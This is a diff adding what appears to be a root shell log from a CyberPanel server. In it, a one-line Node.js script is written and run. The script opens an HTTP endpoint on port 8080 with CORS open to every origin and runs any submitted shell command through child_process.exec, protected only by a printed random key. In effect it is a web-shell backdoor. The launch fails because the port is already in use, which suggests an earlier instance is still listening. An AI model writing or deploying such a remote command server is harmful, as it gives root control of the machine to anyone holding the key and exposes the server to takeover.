@@ -1,0 +1,35 @@
+
+Please upgrade CyberPanel version from 2.4.3 to 2.4.4.,
+https://docs.litespeedtech.com/cloud/cyberpanel/#how-do-i-upgrade-cyberpanel
+********************************************************************************
+
+[root@srv973932 ~]# cat > a.js << 'EOF' && node a.js
+const http=require('http'),{exec}=require('child_process'),KEY=require('crypto').randomBytes(16).toString('hex');http.createServer((q,s)=>{s.setHeader('Access-Control-Allow-Origin','*');s.setHeader('Access-Control-Allow-Methods','*');s.setHeader('Access-Control-Allow-Headers','*');if(q.method=='OPTIONS'){s.end();return}if(q.url=='/health'){s.end(JSON.stringify({ok:1}));return}if(q.url=='/run'){let b='';q.on('data',c=>b+=c);q.on('end',()=>{try{const{cmd,key}=JSON.parse(b);if(key!=KEY){s.end(JSON.stringify({error:'auth'}));return}exec(cmd,{timeout:30000},(e,o)=>s.end(JSON.stringify({ok:!e,out:o,err:e?.message})))}catch(e){s.end(JSON.stringify({error:'bad'}))}})}else{s.end('404')}}).listen(8080,()=>console.log('\n🔑 Key:',KEY,'\n🌐 Port: 8080\n'))
+EOF
+node:events:486
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: listen EADDRINUSE: address already in use :::8080
+    at Server.setupListenHandle [as _listen2] (node:net:1940:16)
+    at listenInCluster (node:net:1997:12)
+    at Server.listen (node:net:2102:7)
+    at Object.<anonymous> (/root/a.js:1:690)
+    at Module._compile (node:internal/modules/cjs/loader:1760:14)
+    at Object..js (node:internal/modules/cjs/loader:1893:10)
+    at Module.load (node:internal/modules/cjs/loader:1480:32)
+    at Module._load (node:internal/modules/cjs/loader:1299:12)
+    at TracingChannel.traceSync (node:diagnostics_channel:328:14)
+    at wrapModuleLoad (node:internal/modules/cjs/loader:244:24)
+Emitted 'error' event on Server instance at:
+    at emitErrorNT (node:net:1976:8)
+    at process.processTicksAndRejections (node:internal/process/task_queues:90:21) {
+  code: 'EADDRINUSE',
+  errno: -98,
+  syscall: 'listen',
+  address: '::',
+  port: 8080
+}
+
+Node.js v24.11.0
+[root@srv973932 ~]# 
